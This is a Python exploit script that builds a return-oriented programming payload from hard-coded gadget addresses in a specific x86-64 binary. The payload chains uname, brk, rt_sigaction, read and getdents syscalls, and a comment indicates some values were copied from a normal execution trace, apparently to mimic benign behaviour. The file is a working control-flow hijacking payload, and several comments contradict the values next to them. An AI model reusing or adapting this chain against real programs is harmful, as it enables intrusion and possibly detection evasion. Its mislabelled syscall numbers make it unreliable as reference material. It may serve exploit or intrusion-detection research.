#!/usr/bin/python
from struct import pack

def do_7(p):
	p += pack("<Q", 0x0000000000435404) # pop rdx ; ret
	p += pack("<Q", 0x00000000006d68a0) # @ .data
	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += "abcdefgh" # abcdefgh file name
	p += pack("<Q", 0x00000000004150ab) # mov QWORD PTR [rdx],rax ; ret

	# uname
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x00000000006d68a0) # @ .data

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000003f) # 63 uname
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

		# call brk 0xecc000 (identified normal value in trace)
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000fcc000) # some address

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000000c) # 12 brk
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

	# call brk again
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000fcc000) # some address

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000000c) # 12 brk
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret
	
	# call brk again
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000fcc000) # some address

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000000c) # 12 brk
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret
	
	# call brk again
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000fcc000) # some address

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000000c) # 12 brk
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

	# call rt_sigaction
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000000004) # 4 signum

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000000d) # 14 rt_sigaction
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

# call rt_sigaction
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000000004) # 4 signum

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000000d) # 14 rt_sigaction
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

# call rt_sigaction
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000000004) # 4 signum

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000000d) # 14 rt_sigaction
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

# call rt_sigaction
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000000004) # 4 signum

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000000d) # 14 rt_sigaction
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

# call rt_sigaction
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000000004) # 4 signum

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000000d) # 14 rt_sigaction
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret


	# call read

	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000000004) # 4 fd
	p += pack("<Q", 0x000000000040c6b7) # pop rsi ; ret
	p += pack("<Q", 0x00000000006d68a8) # @ .data + 8
	p += pack("<Q", 0x0000000000435404) # pop rdx ; ret
	p += pack("<Q", 0x0000000000000008) # size

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x0000000000000000) # 0 read
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

	# call read

	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000000004) # 4 fd
	p += pack("<Q", 0x000000000040c6b7) # pop rsi ; ret
	p += pack("<Q", 0x00000000006d68a8) # @ .data + 8
	p += pack("<Q", 0x0000000000435404) # pop rdx ; ret
	p += pack("<Q", 0x0000000000000008) # size

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x0000000000000000) # 0 read
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

#call getdents
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000000000) # 4
	p += pack("<Q", 0x000000000040c6b7) # pop rsi ; ret
	p += pack("<Q", 0x00000000006d68a0) # @ .data
	p += pack("<Q", 0x0000000000435404) # pop rdx ; ret
	p += pack("<Q", 0x0000000000000000) # 0

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000004e) # 78 getdents
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret


